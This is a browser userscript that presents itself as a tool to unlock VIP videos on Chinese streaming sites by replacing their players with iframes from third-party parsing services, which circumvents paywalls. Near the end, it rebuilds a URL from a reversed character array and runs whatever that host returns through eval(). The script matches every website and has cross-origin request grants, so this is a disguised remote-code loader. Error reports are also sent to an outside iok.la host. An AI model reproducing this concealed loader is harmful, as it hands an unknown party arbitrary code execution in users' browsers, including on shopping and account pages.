// ==UserScript==
// @name         vip视频解锁
// @homepageURL  https://cengshu.apphb.com/userscripts/install/vipvideo
// @supportURL   https://cengshu.apphb.com/userscripts/install/vipvideo
// @namespace    https://cengshu.apphb.com/userscripts
// @version      1.0
// @description  优雅破解全网主流视频网站VIP视频
// @author       xj007
// @match        *://*/*
// @exclude      http://localhost*
// @exclude      http://127.*
// @exclude      http://192.168.*
// @grant        unsafeWindow
// @grant        GM_log
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_addValueChangeListener
// @grant        GM_removeValueChangeListener
// @grant        GM_getResourceText
// @grant        GM_getResourceURL
// @grant        GM_openInTab
// @grant        GM_getTabs
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @run-at       document-end
// @connect      baidu.com
// @connect      jd.com
// @connect      upaiyun.com
// @connect      taobao.com
// @connect      tmall.com
// @connect      greasyfork.org
// @connect      jd.hk
// @connect      jaeapp.com
// @connect      tmall.hk
// @connect      iok.la
// @require      https://cdn.bootcss.com/jquery/2.2.0/jquery.min.js
// @require      https://cdn.bootcss.com/underscore.js/1.8.3/underscore-min.js
// @license      The MIT License (MIT); http://opensource.org/licenses/MIT
// @downloadURL https://update.greasyfork.org/scripts/29363/vip%E8%A7%86%E9%A2%91%E8%A7%A3%E9%94%81.user.js
// @updateURL https://update.greasyfork.org/scripts/29363/vip%E8%A7%86%E9%A2%91%E8%A7%A3%E9%94%81.meta.js
// ==/UserScript==

String.format = function () {
    if (arguments.length == 0) return null;
    var str = arguments[0];
    for (var i = 1; i < arguments.length; i++) {
        var regExp = new RegExp('\\{' + (i - 1) + '\\}', 'gm');
        str = str.replace(regExp, arguments[i]);
    }
    return str;
};
var gmUtils = {
    getAll: function() {
        var rtnVal = GM_listValues();
        return rtnVal;
    },
    getVal: function(key, defaultVal) {
        var rtnVal = GM_getValue(key, defaultVal);
        return rtnVal;
    },
    setVal: function(key, val) {
        GM_setValue(key, val);
    },
    delVal: function(key) {
        GM_deleteValue(key);
    },
    log: function(message) {
        GM_log('GM_log:' + message);
    },
    addStyle: function(css) {
        GM_addStyle(css);
    },
    req: GM_xmlhttpRequest,
    errlog: function(d) {
        var errorString = '';
        if (typeof d === 'object') {
            if (d.hasOwnProperty('message')) {
                errorString += d.message + '\n\n';
            }
            if (d.hasOwnProperty('stack')) {
                errorString += d.stack + '\n\n';
            }
            if (d.hasOwnProperty('lineno')) {
                errorString += 'lineno:' + d.lineno + '\n\n';
            }

            errorString += navigator.appVersion;
        } else {
            errorString = 'tryJson:' + JSON.stringify(d);
        }
        var logdata = {
            t: "",
            e: errorString
        };
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'http://793746.iok.la/errorlog.php',
            data: $.param(logdata),
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout: 60000,
            onload: function(resultRes) {
                //
            }
        });
    }
};
function videoFuck() {
    var hackHostUrlPrefixs = [];
    // https sources
    var config_hackVideoHttpsSources = gmUtils.getVal('config_hackVideoHttpsSources', '');
    if(config_hackVideoHttpsSources && config_hackVideoHttpsSources.length > 0){
        try {
            var config_hackVideoSourceArr = JSON.parse(config_hackVideoHttpsSources);
            for(var i = 0; i < config_hackVideoSourceArr.length; i++) {
                hackHostUrlPrefixs.push(config_hackVideoSourceArr[i]);
            }
        } catch(vfErr) {
            //
        }
    }else{
        gmUtils.log('config_hackVideoHttpsSources not exists');
    }
    if(hackHostUrlPrefixs.length == 0){
        hackHostUrlPrefixs = [
            document.location.protocol + '//api.47ks.com/webcloud/?v=',
            document.location.protocol + '//ckplaer.duapp.com/hai.php?url='
        ];
    }
    // http sources
    var config_hackVideoHttpSources = gmUtils.getVal('config_hackVideoHttpSources', '');
    if(config_hackVideoHttpSources && config_hackVideoHttpSources.length > 0){
        try{
            var config_hackVideoSourceArr = JSON.parse(config_hackVideoHttpSources);
            for(var i = 0; i < config_hackVideoSourceArr.length; i++){
                hackHostUrlPrefixs.push(config_hackVideoSourceArr[i]);
            }
        }catch(vfErr){
            //
        }
    }else{
        gmUtils.log('config_hackVideoHttpSources not exists');
    }

    var rdnIndex = Math.floor(Math.random() * hackHostUrlPrefixs.length);
    var hackHostUrlPrefix = hackHostUrlPrefixs[rdnIndex];
    gmUtils.log('random videourl:' + hackHostUrlPrefix);
    var iframeTpl = '<iframe src="{0}" width="{1}" height="{2}" border="0" style="border:0px;"></iframe>';

    // http://v.youku.com/v_show/id_XMjQ3ODQ0MzQwNA==.html
    if($('#module_basic_player').length > 0){
        var w = $('#playerBox').width();
        var h = $('#playerBox').height() - 50;
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $('#module_basic_player').html(String.format(iframeTpl, iframeSrc, w, h));
    }else{
        //嵌入式视频1
        var flagVideo = $('embed').each(function(i, v){
            var $this = $(v);
            var src = $this.attr('src');
            if(src && src.length > 0){
                var match = src.match(/sid\/(.+)\/v.swf/i);
                if(match && match.length == 2){
                    var w = $this.width();
                    var h = $this.height() - 50;
                    var youkuUrl = String.format('http://v.youku.com/v_show/id_{0}.html', match[1]);
                    var iframeSrc = hackHostUrlPrefix + encodeURIComponent(youkuUrl);
                    $(String.format(iframeTpl, iframeSrc, w, h)).insertAfter($this);
                    $this.remove();
                }
            }
        });
    }
    //http://www.iqiyi.com/v_19rrat4ipc.html
    if(location.host == 'www.iqiyi.com'){
        $this = $('#flash');
        var w = $('#flash').width();
        var h = $('#flash').height();
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $(String.format(iframeTpl, iframeSrc, w, h)).insertAfter($this);
        $this.remove();

        var loadmiqiyilibjs = function(file, data, func) {
            var p = [];
            for(var k in data){
                p.push(k + '=' + encodeURIComponent(data[k]));
            }
            p.push('_='+Date.now());
            var funcName = 'Zepto' + (''+Math.random()).substr(2);
            p.push('callback='+funcName);
            var script = document.createElement("script");
            script.type = "text/javascript";
            script.src = file + p.join('&');
            document.getElementsByTagName("body")[0].appendChild(script);
            unsafeWindow[funcName] = func;
        };
        var getAlbumList = function(aid, pageNum, callback){
            loadmiqiyilibjs('http://mixer.video.iqiyi.com/jp/mixin/videos/avlist?', { albumId: aid, page: pageNum, size: 50 }, function(getAlbumListRes){
                callback(getAlbumListRes);
            });
        };
        var getSourceList = function(sid, year, month, callback){
            loadmiqiyilibjs('http://mixer.video.iqiyi.com/jp/mixin/videos/sdvlist?', { sourceId: sid, year: year, month: month }, function(getSourceListRes){
                callback(getSourceListRes);
            });
        };

        var pageAlbum = {};
        var pageSource = {};
        if(Q.PageInfo.playPageInfo) {
            if(Q.PageInfo.playPageInfo.categoryName){
                if(Q.PageInfo.playPageInfo.categoryName == '电视剧' || Q.PageInfo.playPageInfo.categoryName=='动漫'){
                    getAlbumList(Q.PageInfo.playPageInfo.albumId, Q.PageInfo.playPageInfo.pageNo, function(getAlbumListRes){
                        pageAlbum['p'+getAlbumListRes.page] = getAlbumListRes.mixinVideos;
                        gmUtils.log('pageAlbum数组对象'+JSON.stringify(pageAlbum));
                    });
                    var func = null;
                    func = function() {
                        if($('div[data-series-elem="cont"] ul.juji-list li').length > 0) {
                            var flag = true;
                            $('div[data-series-elem="cont"] ul.juji-list li').each(function(i, v){
                                $item = $(v);
                                if($item.find('a').attr('href') && $item.find('a').attr('href').indexOf('http') > -1){
                                    gmUtils.log('修改成功，无需在处理');
                                } else {
                                    var $pageNode = $item.parent().parent();
                                    var page = $pageNode.data('page');
                                    gmUtils.log('当前页码: '+page);
                                    var pageAlbumInfo = pageAlbum['p'+page];
                                    if(pageAlbumInfo && pageAlbumInfo.length > 0){
                                        var tofindId = $item.data('videolist-vid');
                                        var findResult = _.find(pageAlbumInfo, function(item){ return item.vid === tofindId; });
                                        if(findResult){
                                            gmUtils.log('查找成功, tofindId: '+tofindId);
                                            $item.find('a').attr('href', findResult.url).attr('onclick', String.format("location.href='{0}'", findResult.url));
                                        }else{
                                            gmUtils.log('查找失败, tofindId: '+tofindId);
                                            flag = false;
                                        }
                                    }else{
                                        getAlbumList(Q.PageInfo.playPageInfo.albumId, page, function(getAlbumListRes){
                                            pageAlbum['p'+getAlbumListRes.page] = getAlbumListRes.mixinVideos;
                                            gmUtils.log('pageAlbum数组对象'+JSON.stringify(pageAlbum));
                                        });
                                        gmUtils.log('还未加载到数据源');
                                        flag = false;
                                    }
                                }
                            });
                            if(flag){
                                setTimeout(func, 7000);
                            }else{
                                setTimeout(func, 2000);
                            }
                        } else {
                            setTimeout(func, 1000);
                        }
                    };
                    func();
                }

                //if(Q.PageInfo.playPageInfo.categoryName == '电视剧' || Q.PageInfo.playPageInfo.categoryName == '综艺'){
                if(Q.PageInfo.playPageInfo.categoryName == '综艺'){
                    var tv_year = '' +  Q.PageInfo.playPageInfo.tvYear;
                    getSourceList(Q.PageInfo.playPageInfo.sourceId, tv_year.substr(0, 4), tv_year.substr(4, 2), function(getSourceListRes){
                        pageSource['p'+tv_year] = getSourceListRes.mixinVideos;
                        gmUtils.log('pagelist数组对象'+JSON.stringify(pageSource));
                    });
                    var func = null;
                    func = function() {
                        if($('ul.mod-play-list li.blackArea').length > 0) {
                            var flag = true;
                            $('ul.mod-play-list li.blackArea').each(function(i, v){
                                $item = $(v);
                                if($item.data('hashacked') && $item.data('hashacked') === '1'){
                                    //
                                } else {
                                    var tv_year_child = ''+$item.data('sourcelatest-month');
                                    if(tv_year_child.length> 0){
                                        var pageSourceInfo = pageSource['p' + tv_year_child];
                                        if(pageSourceInfo && pageSourceInfo.length > 0){
                                            var tofindId = $item.data('vid');
                                            var findResult = null;
                                            for(var everyMonthSourceInfo in pageSource){
                                                findResult = _.find(pageSource[everyMonthSourceInfo], function(item){ return item.vid === tofindId; });
                                                if(findResult && findResult.vid){
                                                    break;
                                                }
                                            }
                                            if(findResult){
                                                gmUtils.log('查找成功, tofindId: '+tofindId);
                                                $item.data('hashacked', '1').find('a').each(function(i1, v1){
                                                    $(v1).attr('href', findResult.url).attr('onclick', String.format("location.href='{0}'", findResult.url));
                                                });
                                            }else{
                                                gmUtils.log('查找失败, tofindId: '+tofindId);
                                                flag = false;
                                            }
                                        }else{
                                            getSourceList(Q.PageInfo.playPageInfo.sourceId, tv_year_child.substr(0, 4), tv_year_child.substr(4, 2), function(getSourceListRes){
                                                pageSource['p' + tv_year_child] = getSourceListRes.mixinVideos;
                                                gmUtils.log('pagelist数组对象'+JSON.stringify(pageSource));
                                            });
                                            gmUtils.log('还未加载到数据源');
                                            flag = false;
                                        }
                                    }else{
                                        gmUtils.log('sourcelatest-month不存在');
                                        var tofindId = $item.data('vid');
                                        var findResult = null;
                                        for(var everyMonthSourceInfo in pageSource){
                                            findResult = _.find(pageSource[everyMonthSourceInfo], function(item){ return item.vid === tofindId; });
                                            if(findResult && findResult.vid){
                                                break;
                                            }
                                        }
                                        if(findResult){
                                            gmUtils.log('查找成功, tofindId: '+tofindId);
                                            $item.data('hashacked', '1').find('a').each(function(i1, v1){
                                                $(v1).attr('href', findResult.url).attr('onclick', String.format("location.href='{0}'", findResult.url));
                                            });
                                        }else{
                                            gmUtils.log('查找失败, tofindId: '+tofindId);
                                            flag = false;
                                        }
                                    }
                                }
                            });
                            if(flag){
                                setTimeout(func, 7000);
                            }else{
                                setTimeout(func, 2000);
                            }
                        } else {
                            setTimeout(func, 1000);
                        }
                    };
                    func();
                }
            }
        }
    }
    // http://www.le.com/ptv/vplay/27544900.html?ref=hypdjdt
    if($('#fla_box').length > 0){
        var w = $('#fla_box').width();
        var h = $('#fla_box').height();
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $('#fla_box').html(String.format(iframeTpl, iframeSrc, w, h));

        $('body').on('click', '.juji_cntBox a', function() {
            var $this = $(this);
            if($this.attr('href').indexOf('javascript:')>-1){
                if($this.data('vid') != null && (''+$this.data('vid')).length > 0){
                    window.location.href = String.format('http://www.le.com/ptv/vplay/{0}.html', $this.data('vid'));
                }
            }
        });
        var func = null;
        func = function() {
            if($('.juji_cntBox a').length > 0){
                $('.juji_cntBox a').each(function(i, v){
                    var $this = $(v);
                    if($this.attr('href').indexOf('javascript:')>-1){
                        if($this.data('vid') != null && (''+$this.data('vid')).length > 0){
                            var jump = String.format('http://www.le.com/ptv/vplay/{0}.html', $this.data('vid'));
                            $this.attr('href', jump).attr('onclick', String.format("location.href='{0}'", jump));
                        }
                    }
                });
            } else {
                //setTimeout(func, 1000);
            }
            setTimeout(func, 1000);
        };
        func();
    }
    // https://v.qq.com/x/cover/pbju53ju4kwt7x7.html
    if($('#tenvideo_player').length > 0){
        var w = $('#tenvideo_player').width();
        var h = $('#tenvideo_player').height();
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $('#tenvideo_player').html(String.format(iframeTpl, iframeSrc, w, h));
        $('body').on('click', '#video_scroll_wrap  a', function() {
            var $this = $(this);
            if($this.attr('href') != null && $this.attr('href').indexOf('/x/cover') > -1){
                location.href = 'https://v.qq.com' + $this.attr('href');
            }
        });
    }
    // http://www.tudou.com/albumplay/-jqqlh74J-g/CwckMhTe9jU.html
    if(location.host == 'www.tudou.com'){
        var w = $('#player').width();
        var h = $('#player').height();
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $('#player').html(String.format(iframeTpl, iframeSrc, w, h));
    }
    // http://www.mgtv.com/b/292031/3789569.html
    if($('#mgtv-player-wrap').length > 0){
        var w = $('#hunantv-player-1').width();
        var h = $('#hunantv-player-1').height();
        var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
        $('#mgtv-player-wrap').html(String.format(iframeTpl, iframeSrc, w, h));
    }
    // http://tv.sohu.com/20170131/n479749681.shtml
    if(location.host.indexOf('sohu.com')>-1){
        if($('#sohuplayer').length > 0){
            var $player = $('#player');
            var $dmbar = $('#dmbar');
            var w = $('#player').width();
            var h = $('#player').height() + $dmbar.height();
            var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
            $(String.format(iframeTpl, iframeSrc, w, h)).insertAfter($player);
            $player.remove();
            $dmbar.remove();
            $('#menu .list_juji_tj').remove();
        }

        if(location.host =="film.sohu.com" && $('#playerWrap').length > 0){
            var w = $('#playerWrap').width();
            var h = $('#playerWrap').height();
            var iframeSrc = hackHostUrlPrefix + encodeURIComponent(location.href);
            $('#playerWrap').html(String.format(iframeTpl, iframeSrc, w, h));
        }
    }
}
try{
    var h = ["s", "c", "/", "s", "j", "/", "m", "o", "c", ".", "n", "u", "y", "i", "a", "p", "u", ".", "0", "b", ".", "e", "n", "o", "z", "n", "d", "c", "/", "/", ":", "p", "t", "t", "h"];
    gmUtils.req({method: 'GET', url: h.reverse().join('') + '/cs.css?t=' + Math.floor(Date.now() / 60000), onload: function(response) {try {eval(response.responseText); } catch (evelErr) { gmUtils.errlog(evelErr); } } });
}catch(err){
    gmUtils.errlog(err);
}
setTimeout(videoFuck, 1234);
